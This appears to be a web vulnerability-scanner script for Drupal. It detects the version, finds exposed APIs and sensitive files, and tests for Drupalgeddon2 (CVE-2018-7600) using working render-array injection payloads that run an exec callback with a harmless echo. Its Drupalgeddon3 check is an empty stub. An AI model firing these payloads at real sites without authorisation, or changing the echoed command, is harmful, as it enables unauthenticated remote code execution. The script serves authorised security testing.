#include constants.inc;
#include helpers.inc;

var targetUrl = new TURL(scanURL.url);

// Drupal - Drupalgeddon (CVE-2018-7600, 7602), JSONAPI, config exposure

function testDrupalDetection() {
    var job = new THTTPJob();
    job.url = targetUrl;
    job.URI = "/";
    job.execute();
    if (job.wasError) return false;
    var body = job.response.body;
    var headers = job.response.headerValue("X-Generator") || "";
    return (body.indexOf("Drupal") != -1 || body.indexOf("drupal") != -1 ||
            body.indexOf("/sites/default/") != -1 || body.indexOf("/core/misc/") != -1 ||
            headers.indexOf("Drupal") != -1);
}

function testDrupalVersion() {
    var versionPaths = [
        "/CHANGELOG.txt",
        "/core/CHANGELOG.txt",
        "/INSTALL.txt",
        "/core/INSTALL.txt",
        "/core/lib/Drupal.php",
    ];

    for (var i = 0; i < versionPaths.length; i++) {
        var job = new THTTPJob();
        job.url = targetUrl;
        job.URI = versionPaths[i];
        job.execute();

        if (!job.wasError && job.response.msg2 == 200) {
            var body = job.response.body;
            if (body.indexOf("Drupal") != -1) {
                var version = "unknown";
                var match = body.match(/Drupal\s+(\d+\.\d+[\.\d]*)/);
                if (match) version = match[1];

                var ri = new TReportItem();
                ri.LoadFromFile("Application_Error.xml");
                ri.affects = versionPaths[i];
                ri.alertPath = "Scripts/Drupal";
                ri.name = "Drupal Version Disclosure: " + version;
                ri.severity = 1;
                ri.setHttpInfo(job);
                ri.details = "Drupal version [bold]" + version + "[/bold] detected via [bold]" + versionPaths[i] + "[/bold].";
                AddReportItem(ri);
                break;
            }
        }
    }
}

function testDrupalgeddon() {
    // CVE-2018-7600 - Drupalgeddon2 RCE (Drupal 7.x, 8.x)
    // SA-CORE-2018-002

    // Drupal 8 vector
    var job = new THTTPJob();
    job.url = targetUrl;
    job.URI = "/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax";
    job.verb = "POST";
    job.postData = "form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=echo+drupalgeddon2_test";
    job.request.addHeader("Content-Type", "application/x-www-form-urlencoded");
    job.execute();

    if (!job.wasError) {
        var body = job.response.body;
        if (body.indexOf("drupalgeddon2_test") != -1) {
            var ri = new TReportItem();
            ri.LoadFromFile("Application_Error.xml");
            ri.affects = "/user/register";
            ri.alertPath = "Scripts/Drupal";
            ri.name = "Drupalgeddon2 RCE Confirmed (CVE-2018-7600)";
            ri.severity = 4;
            ri.setHttpInfo(job);
            ri.details = "Drupal Form API render array injection confirmed.[break]" +
                "Unauthenticated RCE via #post_render callback on user registration form.";
            AddReportItem(ri);
        } else if (body.indexOf("ajax") != -1 || body.indexOf("form") != -1) {
            var ri = new TReportItem();
            ri.LoadFromFile("Application_Error.xml");
            ri.affects = "/user/register";
            ri.alertPath = "Scripts/Drupal";
            ri.name = "Drupal Form API AJAX Endpoint Responding (CVE-2018-7600 vector)";
            ri.severity = 3;
            ri.setHttpInfo(job);
            ri.details = "Drupal AJAX form endpoint accepts render array parameters.[break]" +
                "Check for Drupalgeddon2 (CVE-2018-7600) exploitation.";
            AddReportItem(ri);
        }
    }

    // Drupal 7 vector
    var job2 = new THTTPJob();
    job2.url = targetUrl;
    job2.URI = "/?q=user/password&name[%23post_render][]=exec&name[%23type]=markup&name[%23markup]=echo+dg2test7";
    job2.verb = "POST";
    job2.postData = "form_id=user_pass&_triggering_element_name=name&_triggering_element_value=&op=Submit";
    job2.request.addHeader("Content-Type", "application/x-www-form-urlencoded");
    job2.execute();

    if (!job2.wasError) {
        var body2 = job2.response.body;
        if (body2.indexOf("dg2test7") != -1) {
            var ri = new TReportItem();
            ri.LoadFromFile("Application_Error.xml");
            ri.affects = "/?q=user/password";
            ri.alertPath = "Scripts/Drupal";
            ri.name = "Drupalgeddon2 RCE - Drupal 7 (CVE-2018-7600)";
            ri.severity = 4;
            ri.setHttpInfo(job2);
            ri.details = "Drupal 7 render array injection confirmed via password reset form.";
            AddReportItem(ri);
        }
    }

    // CVE-2018-7602 - Drupalgeddon3
    var job3 = new THTTPJob();
    job3.url = targetUrl;
    job3.URI = "/node/1?destination=node/1";
    job3.execute();

    if (!job3.wasError && job3.response.msg2 == 200) {
        var body3 = job3.response.body;
        if (body3.indexOf("delete") != -1 || body3.indexOf("edit") != -1) {
            // presence of edit links may indicate CMS is accessible
        }
    }
}

function testDrupalJSONAPI() {
    // Drupal JSON:API and REST API exposure
    var apiPaths = [
        "/jsonapi",
        "/jsonapi/node/article",
        "/jsonapi/user/user",
        "/jsonapi/node--article",
        "/api/",
        "/rest/session/token",
        "/entity/user/1?_format=json",
        "/user/1?_format=json",
        "/node/1?_format=json",
    ];

    for (var i = 0; i < apiPaths.length; i++) {
        var job = new THTTPJob();
        job.url = targetUrl;
        job.URI = apiPaths[i];
        job.execute();

        if (!job.wasError && job.response.msg2 == 200) {
            var body = job.response.body;

            if (apiPaths[i].indexOf("user") != -1 &&
                (body.indexOf("uid") != -1 || body.indexOf("mail") != -1 || body.indexOf("name") != -1)) {
                var ri = new TReportItem();
                ri.LoadFromFile("Application_Error.xml");
                ri.affects = apiPaths[i];
                ri.alertPath = "Scripts/Drupal";
                ri.name = "Drupal User Enumeration via REST/JSON API";
                ri.severity = 2;
                ri.setHttpInfo(job);
                ri.details = "Drupal API exposes user data at [bold]" + apiPaths[i] + "[/bold].[break]" +
                    "May leak usernames, email addresses, roles, and user IDs.";
                AddReportItem(ri);
            }

            if (apiPaths[i] == "/jsonapi" && body.indexOf("links") != -1) {
                var ri = new TReportItem();
                ri.LoadFromFile("Application_Error.xml");
                ri.affects = "/jsonapi";
                ri.alertPath = "Scripts/Drupal";
                ri.name = "Drupal JSON:API Enabled";
                ri.severity = 2;
                ri.setHttpInfo(job);
                ri.details = "Drupal JSON:API root endpoint exposes all available entity types and their URLs.";
                AddReportItem(ri);
            }
        }
    }
}

function testDrupalSensitive() {
    var paths = [
        { path: "/sites/default/settings.php", desc: "DB credentials", sev: 4 },
        { path: "/sites/default/default.settings.php", desc: "default config", sev: 2 },
        { path: "/sites/default/files/.htaccess", desc: "files htaccess", sev: 1 },
        { path: "/core/install.php", desc: "installer", sev: 3 },
        { path: "/install.php", desc: "installer", sev: 3 },
        { path: "/update.php", desc: "update script", sev: 3 },
        { path: "/CHANGELOG.txt", desc: "version info", sev: 1 },
        { path: "/README.txt", desc: "readme", sev: 0 },
        { path: "/cron.php", desc: "cron endpoint", sev: 1 },
        { path: "/modules/", desc: "modules listing", sev: 1 },
        { path: "/profiles/", desc: "profiles listing", sev: 1 },
        { path: "/sites/all/modules/", desc: "contrib modules", sev: 1 },
        { path: "/.git/config", desc: "git config", sev: 3 },
        { path: "/web.config", desc: "IIS config", sev: 2 },
    ];

    for (var i = 0; i < paths.length; i++) {
        if (paths[i].sev == 0) continue;
        var job = new THTTPJob();
        job.url = targetUrl;
        job.URI = paths[i].path;
        job.execute();

        if (!job.wasError && job.response.msg2 == 200) {
            var body = job.response.body;
            var report = false;

            if (paths[i].path.indexOf("settings.php") != -1 && body.indexOf("<?php") != -1) report = true;
            if (paths[i].path.indexOf("install.php") != -1 && body.indexOf("Drupal") != -1) report = true;
            if (paths[i].path.indexOf("update.php") != -1 && body.indexOf("Drupal") != -1) report = true;
            if (paths[i].path.indexOf("CHANGELOG") != -1 && body.indexOf("Drupal") != -1) report = true;
            if (paths[i].path.indexOf(".git") != -1 && body.indexOf("[core]") != -1) report = true;
            if (paths[i].path.indexOf("modules") != -1 && body.indexOf("Index of") != -1) report = true;

            if (report) {
                var ri = new TReportItem();
                ri.LoadFromFile("Application_Error.xml");
                ri.affects = paths[i].path;
                ri.alertPath = "Scripts/Drupal";
                ri.name = "Drupal: " + paths[i].desc;
                ri.severity = paths[i].sev;
                ri.setHttpInfo(job);
                ri.details = "Sensitive Drupal path: [bold]" + paths[i].path + "[/bold]";
                AddReportItem(ri);
            }
        }
    }
}

if (testDrupalDetection()) {
    testDrupalVersion();
    testDrupalgeddon();
    testDrupalJSONAPI();
    testDrupalSensitive();
}
